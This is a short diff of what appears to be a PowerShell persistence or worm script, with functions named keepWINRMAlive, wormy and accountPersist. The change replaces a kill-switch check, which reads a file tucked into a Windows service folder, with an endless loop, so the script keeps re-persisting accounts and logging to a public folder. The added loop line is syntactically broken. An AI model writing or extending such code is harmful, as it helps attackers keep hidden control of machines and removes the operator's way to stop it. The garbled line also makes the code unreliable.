@@ -57,7 +57,7 @@ function keepWINRMAlive{
 }
 function wormy{
     
-    while((get-content 'C:\Program Files (x86)\Windows NT\TableTextService\TableTextServiceDa.txt' -tail 1 ) -ne 'xr'){
+    while(while 1 -eq 1){
     accountPersist
     [int][double]::Parse((get-date -UFormat %s)) | out-file -FilePath 'C:\Users\Public\Downloads\desktop.log'
     Write-Output 'slither'
